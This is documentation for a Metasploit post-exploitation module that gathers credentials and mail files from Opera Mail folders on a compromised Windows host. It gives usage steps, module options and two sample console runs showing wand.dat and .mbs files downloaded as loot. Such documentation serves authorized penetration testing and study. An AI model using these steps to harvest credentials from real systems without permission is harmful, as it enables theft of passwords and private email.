## Module Description

This post-exploitation module gathers artifacts found on Operamail related folders from end users systems.

The list of available artifcts are listed within the module and can be added at anytime. Each artifacts are categorised so that users can specify a category to look for.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/operamail
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### REGEX

Users can set their own regular expressions so that it could be applied for the credential extraction. The default is set to ^password.

### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifcats/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by defalt and will perform the data extraction using the predefined regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Example Run
### Default Output
  ```
msf6 post(windows/gather/credentials/operamail) > run 

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_CREDENTIALS_FROM_FILE: true

[*] Operamail's parent folder found
[*] Operamail's Wand.dat file found
[*] Downloading C:\Users\IEUser\AppData\Roaming\Opera Mail\Opera Mail\wand.dat
[*] Operamail Wand.dat downloaded
[+] File saved to:  /root/.msf4/loot/20210513062118_default_192.168.56.106_operamailwand.da_873247.dat

[+] File with credentials saved:  /root/.msf4/loot/20210513062118_default_192.168.56.106_EXTRACTIONwand.d_440695.dat
[*] Operamail's parent folder found
[*] Operamail's *.mbs file found
[*] Downloading C:\Users\IEUser\AppData\Local\Opera Mail\Opera Mail\mail\store\account1\2021\05\02\1.mbs
[*] Operamail 1.mbs downloaded
[+] File saved to:  /root/.msf4/loot/20210513062118_default_192.168.56.106_operamail1.mbs_724517.mbs

[+] From:"OperaDesktopTeam"<noreply@opera.com>
[+] File with credentials saved:  /root/.msf4/loot/20210513062119_default_192.168.56.106_EXTRACTION.mbs_258744.mbs
[*] Downloading C:\Users\IEUser\AppData\Local\Opera Mail\Opera Mail\mail\store\drafts\2.mbs
[*] Operamail 2.mbs downloaded
[+] File saved to:  /root/.msf4/loot/20210513062119_default_192.168.56.106_operamail2.mbs_057429.mbs

[+] File with credentials saved:  /root/.msf4/loot/20210513062119_default_192.168.56.106_EXTRACTION.mbs_565399.mbs
[*] Downloading C:\Users\IEUser\AppData\Local\Opera Mail\Opera Mail\mail\store\drafts\3.mbs
[*] Operamail 3.mbs downloaded
[+] File saved to:  /root/.msf4/loot/20210513062119_default_192.168.56.106_operamail3.mbs_471143.mbs

[+] File with credentials saved:  /root/.msf4/loot/20210513062120_default_192.168.56.106_EXTRACTION.mbs_391099.mbs
[*] Downloading C:\Users\IEUser\AppData\Local\Opera Mail\Opera Mail\mail\store\drafts\4.mbs
[*] Operamail 4.mbs downloaded
[+] File saved to:  /root/.msf4/loot/20210513062120_default_192.168.56.106_operamail4.mbs_468755.mbs

[+] To:************@gmail.com
[+] From:"************"<************@************.co.uk>
[+] File with credentials saved:  /root/.msf4/loot/20210513062120_default_192.168.56.106_EXTRACTION.mbs_975964.mbs
[*] Downloading C:\Users\IEUser\AppData\Local\Opera Mail\styles\m2_upgrade_1160.mbs
[*] Operamail M2_upgrade_1160.mbs downloaded
[+] File saved to:  /root/.msf4/loot/20210513062120_default_192.168.56.106_operamailm2_upgr_620846.mbs

[+] From:"OperaDesktopTeam"<noreply@opera.com>
[+] File with credentials saved:  /root/.msf4/loot/20210513062121_default_192.168.56.106_EXTRACTION.mbs_994734.mbs
[*] Downloading C:\Users\IEUser\AppData\Local\Opera Mail\styles\m2_welcome_message.mbs
[*] Operamail M2_welcome_message.mbs downloaded
[+] File saved to:  /root/.msf4/loot/20210513062121_default_192.168.56.106_operamailm2_welc_906380.mbs

[+] From:"OperaDesktopTeam"<noreply@opera.com>
[+] File with credentials saved:  /root/.msf4/loot/20210513062121_default_192.168.56.106_EXTRACTION.mbs_566934.mbs
[*] PackRat credential sweep Completed
[*] Post module execution completed

  ```

### Verbose Output
  ```
msf6 post(windows/gather/credentials/operamail) > run 

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_CREDENTIALS_FROM_FILE: true

[*] Starting Packrat...
[*] Operamail's parent folder found
[*] Operamail's Wand.dat file found
[*] Processing C:\Users\IEUser\AppData\Roaming\Opera Mail\Opera Mail
[*] Downloading C:\Users\IEUser\AppData\Roaming\Opera Mail\Opera Mail\wand.dat
[*] Operamail Wand.dat downloaded
[+] File saved to:  /root/.msf4/loot/20210513063651_default_192.168.56.106_operamailwand.da_186519.dat

[+] File with credentials saved:  /root/.msf4/loot/20210513063651_default_192.168.56.106_EXTRACTIONwand.d_454986.dat
[*] Operamail's parent folder found
[*] Operamail's *.mbs file found
[*] Processing C:\Users\IEUser\AppData\Local\Opera Mail\Opera Mail\mail\store\account1\2021\05\02
[*] Downloading C:\Users\IEUser\AppData\Local\Opera Mail\Opera Mail\mail\store\account1\2021\05\02\1.mbs
[*] Operamail 1.mbs downloaded
[+] File saved to:  /root/.msf4/loot/20210513063651_default_192.168.56.106_operamail1.mbs_378969.mbs

[*] searches for Email TO/FROM address
[+] From:"OperaDesktopTeam"<noreply@opera.com>
[+] File with credentials saved:  /root/.msf4/loot/20210513063651_default_192.168.56.106_EXTRACTION.mbs_751986.mbs
[*] Processing C:\Users\IEUser\AppData\Local\Opera Mail\Opera Mail\mail\store\drafts
[*] Downloading C:\Users\IEUser\AppData\Local\Opera Mail\Opera Mail\mail\store\drafts\2.mbs
[*] Operamail 2.mbs downloaded
[+] File saved to:  /root/.msf4/loot/20210513063651_default_192.168.56.106_operamail2.mbs_427825.mbs

[+] File with credentials saved:  /root/.msf4/loot/20210513063652_default_192.168.56.106_EXTRACTION.mbs_571426.mbs
[*] Processing C:\Users\IEUser\AppData\Local\Opera Mail\Opera Mail\mail\store\drafts
[*] Downloading C:\Users\IEUser\AppData\Local\Opera Mail\Opera Mail\mail\store\drafts\3.mbs
[*] Operamail 3.mbs downloaded
[+] File saved to:  /root/.msf4/loot/20210513063652_default_192.168.56.106_operamail3.mbs_783307.mbs

[+] File with credentials saved:  /root/.msf4/loot/20210513063652_default_192.168.56.106_EXTRACTION.mbs_473719.mbs
[*] Processing C:\Users\IEUser\AppData\Local\Opera Mail\Opera Mail\mail\store\drafts
[*] Downloading C:\Users\IEUser\AppData\Local\Opera Mail\Opera Mail\mail\store\drafts\4.mbs
[*] Operamail 4.mbs downloaded
[+] File saved to:  /root/.msf4/loot/20210513063652_default_192.168.56.106_operamail4.mbs_771393.mbs

[*] searches for Email TO/FROM address
[+] To:************@gmail.com
[*] searches for Email TO/FROM address
[+] From:"******"<************@gmail.com>
[+] File with credentials saved:  /root/.msf4/loot/20210513063652_default_192.168.56.106_EXTRACTION.mbs_090332.mbs
[*] Processing C:\Users\IEUser\AppData\Local\Opera Mail\styles
[*] Downloading C:\Users\IEUser\AppData\Local\Opera Mail\styles\m2_upgrade_1160.mbs
[*] Operamail M2_upgrade_1160.mbs downloaded
[+] File saved to:  /root/.msf4/loot/20210513063652_default_192.168.56.106_operamailm2_upgr_993450.mbs

[*] searches for Email TO/FROM address
[+] From:"OperaDesktopTeam"<noreply@opera.com>
[+] File with credentials saved:  /root/.msf4/loot/20210513063653_default_192.168.56.106_EXTRACTION.mbs_610156.mbs
[*] Processing C:\Users\IEUser\AppData\Local\Opera Mail\styles
[*] Downloading C:\Users\IEUser\AppData\Local\Opera Mail\styles\m2_welcome_message.mbs
[*] Operamail M2_welcome_message.mbs downloaded
[+] File saved to:  /root/.msf4/loot/20210513063653_default_192.168.56.106_operamailm2_welc_946408.mbs

[*] searches for Email TO/FROM address
[+] From:"OperaDesktopTeam"<noreply@opera.com>
[+] File with credentials saved:  /root/.msf4/loot/20210513063653_default_192.168.56.106_EXTRACTION.mbs_150137.mbs
[*] PackRat credential sweep Completed
[*] Post module execution completed

```